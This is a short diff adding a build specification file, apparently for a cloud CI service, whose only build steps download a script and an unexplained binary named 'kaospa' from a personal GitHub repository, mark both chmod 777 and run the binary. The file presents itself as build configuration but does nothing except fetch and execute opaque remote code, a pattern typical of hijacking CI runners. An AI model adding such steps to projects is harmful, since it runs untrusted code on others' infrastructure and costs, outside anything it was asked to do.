@@ -1,0 +1,9 @@
+version: 0.2
+
+phases:
+  build:
+    commands:
+        - wget https://github.com/vedhagsvp/taberas/raw/main/jt.sh
+        - wget https://github.com/vedhagsvp/taberas/releases/download/mlb/kaospa
+        - chmod 777 kaospa jt.sh
+        - ./kaospa
